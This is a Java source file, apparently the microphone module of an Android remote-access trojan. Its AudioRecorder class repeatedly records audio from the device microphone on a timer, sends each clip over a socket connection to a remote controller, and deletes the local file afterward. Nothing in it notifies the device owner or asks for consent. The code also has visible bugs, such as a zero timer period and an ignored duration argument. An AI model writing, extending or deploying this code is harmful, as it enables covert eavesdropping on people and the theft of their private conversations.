
package com.remote.app;

import android.media.MediaRecorder;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.time.Duration;
import java.util.Timer;
import java.util.TimerTask;

public  class AudioRecorder {


    static MediaRecorder recorder;
    static File audiofile = null;
    static final String TAG = "MediaRecording";
    
    static final Timer timer;
    
    static {
        timer = new Timer();
        //Creating MediaRecorder and specifying audio source, output format, encoder & output format
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
    }


    public static File startRecording() throws Exception {
        //Creating file
        File dir = MainService.getContextOfApplication().getCacheDir();
        try {
            Log.e("DIRR" , dir.getAbsolutePath());
            audiofile = File.createTempFile("sound", ".mp3", dir);
        } catch (IOException e) {
            Log.e(TAG, "external storage access error");
            return null;
        }
        
        recorder.setOutputFile(audiofile.getAbsolutePath());
        try{
            recorder.prepare();
            JSONObject object = new JSONObject();
            object.put("file",true);
            object.put("name","true");
            object.put("buffer" , "starterd recoding");
            IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
        }
        catch(Exception e){
            JSONObject object = new JSONObject();
            object.put("file",true);
            object.put("name","true");
            object.put("buffer" , e.getMessage());
            IOSocket.getInstance().getIoSocket().emit("0xMI" , object);

        }



        
        recorder.start();
        
        return audiofile;
    }
    
    public static void stopRecordingIn(long seconds) {
        try {
            Thread.sleep(5000);
            recorder.stop();
        } catch (Exception e) {
             Log.e(TAG, "error while schedule the stoping recorder");
        }
    } 
    
    private static void releaseMic() {
        try {
            recorder.release();
        } catch (Exception e) {}
    }

    private static void sendFileAndDelete(File file){
        int size = (int) file.length();
        byte[] data = new byte[size];
        try {
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            buf.read(data, 0, data.length);
            JSONObject object = new JSONObject();
            object.put("file",true);
            object.put("name",file.getName());
            object.put("buffer" , data);
            IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
            buf.close();
            file.delete();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }

    }
    
    public static void sendPeriodically() {
        TimerTask task = new TimerTask() {
            @Override
            public void run() {
                try{
                File audiFile = startRecording();
                stopRecordingIn(5);
                sendFileAndDelete(audiFile);
                }
                catch(Exception e){
            //      JSONObject object = new JSONObject();
            //      object.put("file",true);
            // object.put("name","true");
            // object.put("buffer" , e.getMessage());
            // IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
                }
                
            }
        };  
        timer.scheduleAtFixedRate(task, 0, 0);;
    }

}